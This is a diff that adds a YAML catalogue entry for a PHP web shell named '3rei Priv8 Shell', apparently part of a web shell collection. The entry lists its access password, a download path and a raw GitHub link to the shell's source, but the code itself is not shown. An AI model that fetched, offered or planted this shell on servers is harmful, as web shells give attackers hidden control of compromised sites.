@@ -1,0 +1,7 @@
+- name: 3rei `Priv8` Shell
+  image: /preview/3rei_view.webp
+  size: "20kb"
+  password: "mangsut#123"
+  version: "1.0.1"
+  download: /PHP/me/3rei.php
+  raw: https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/me/3rei.php
